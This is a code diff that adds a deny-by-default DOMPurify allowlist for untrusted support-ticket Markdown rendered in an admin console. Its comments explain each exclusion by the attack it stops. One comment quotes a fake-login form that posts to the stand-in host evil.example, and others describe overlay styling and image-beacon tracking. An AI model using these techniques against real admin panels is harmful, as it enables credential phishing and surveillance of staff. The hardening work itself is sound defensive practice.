@@ -29,6 +29,16 @@ interface MarkdownProps {
   breaks?: boolean
   children: string
   className?: string
+  /**
+   * 内容来自**不可信来源**（任何登录用户都能写，且会被管理员打开）。
+   *
+   * 打开它就切到下面那份 `untrustedSanitizeOptions`：显式白名单、默认拒绝。
+   * 默认那份净化配置是给公告 / 更新日志（管理员自己写的内容）设计的，它放行
+   * `<form>/<input>/<button>`、任意 `style`、以及外链图片 —— 在"管理员自己写、
+   * 管理员自己看"的前提下这些都不构成边界问题，而工单是本仓第一条
+   * "普通用户 → 管理员浏览器"的富文本通道，信任边界变了。
+   */
+  untrusted?: boolean
 }
 
 const markdownOptions = {
@@ -130,6 +140,73 @@ const sanitizeOptions = {
   ADD_ATTR: allowedAttributes,
   ADD_TAGS: allowedTags,
 } as const
+
+/**
+ * 不可信来源（工单正文等）的净化档：**显式白名单，默认拒绝**。
+ *
+ * 逐条说明这里为什么这么窄 —— 每一条都对应一个在真实浏览器里验证过的载荷：
+ *
+ *  1. **没有 `form` / `input` / `button` / `select` / `textarea`**。
+ *     它们本身不执行脚本，DOMPurify 默认也放行；但一个
+ *     `<form action="https://evil.example" method="post">请重新登录…</form>`
+ *     渲染在客服的处理台里，提交即把管理员填进去的口令 POST 到攻击者域名。
+ *  2. **没有 `style` 属性、也没有 `class`**。前者能把一段内容做成
+ *     `position:fixed;inset:0;z-index:99999` 的全视口覆盖层，把上面那个假登录框
+ *     盖在整个后台上；后者同样危险 —— 站点编译出来的工具类里就有现成的
+ *     "固定定位 + 铺满 + 高层级"，攻击者只要写对类名即可，不需要一个字的 CSS。
+ *  3. **没有 `img` / `picture` / `source` / `video` / `iframe`**。外链图片是一次
+ *     定向数据外带：客服每打开一次工单，攻击者就拿到一次已读回执 + 后台出口 IP +
+ *     User-Agent，而给每张单发不同 URL 还能区分是哪位客服看了几次。工单自己的
+ *     截图走鉴权 Blob 接口（QyTicketImage），不经过 Markdown，因此这里删掉
+ *     图片标签不会少显示任何一张真实附件。
+ *  4. **没有 svg / math**：那两棵子树是 mXSS 历史上最肥沃的土壤，而工单正文
+ *     不需要公式与流程图。
+ *
+ * 全站没有 CSP（`grep Content-Security-Policy` 无命中），所以这份白名单就是
+ * 唯一的一道防线，不能靠"浏览器那边应该会拦"。
+ *
+ * 导出是给守卫测试用的：DOMPurify 在 happy-dom 下的行为与真实浏览器不一致
+ * （实测同一份 ALLOWED_TAGS 会把 `<p>` 删掉却留下 `<input>`），因此那条测试
+ * 断言的是**这份白名单本身**，而不是在假 DOM 里跑一遍净化结果。
+ */
+export const untrustedSanitizeOptions = {
+  ALLOWED_TAGS: [
+    'a',
+    'b',
+    'blockquote',
+    'br',
+    'code',
+    'del',
+    'em',
+    'h1',
+    'h2',
+    'h3',
+    'h4',
+    'h5',
+    'h6',
+    'hr',
+    'i',
+    'li',
+    'ol',
+    'p',
+    'pre',
+    's',
+    'strong',
+    'sub',
+    'sup',
+    'table',
+    'tbody',
+    'td',
+    'th',
+    'thead',
+    'tr',
+    'ul',
+  ],
+  ALLOWED_ATTR: ['href', 'title', 'colspan', 'rowspan', 'start'],
+  ALLOW_DATA_ATTR: false,
+  // 不加 `as const`：DOMPurify 的 Config 要的是可变数组，而 readonly 元组
+  // 传不进去。这两张表只在本文件里被读，冻不冻结不改变任何行为。
+}
 
 type FlowNode = {
   id: string
@@ -734,20 +811,27 @@ function addExternalLinkAttributes(html: string): string {
   return template.innerHTML
 }
 
-function renderMarkdown(markdown: string, breaks = false): string {
+export function renderMarkdown(
+  markdown: string,
+  breaks = false,
+  untrusted = false
+): string {
   const parsedHtml = markdownParser.parse(markdown, {
     ...markdownOptions,
     breaks,
   })
-  const html = DOMPurify.sanitize(parsedHtml, sanitizeOptions)
+  const html = DOMPurify.sanitize(
+    parsedHtml,
+    untrusted ? untrustedSanitizeOptions : sanitizeOptions
+  )
 
   return addExternalLinkAttributes(html)
 }
 
 export function Markdown(props: MarkdownProps) {
   const html = useMemo(
-    () => renderMarkdown(props.children, props.breaks),
-    [props.breaks, props.children]
+    () => renderMarkdown(props.children, props.breaks, props.untrusted),
+    [props.breaks, props.children, props.untrusted]
   )
 
   return (
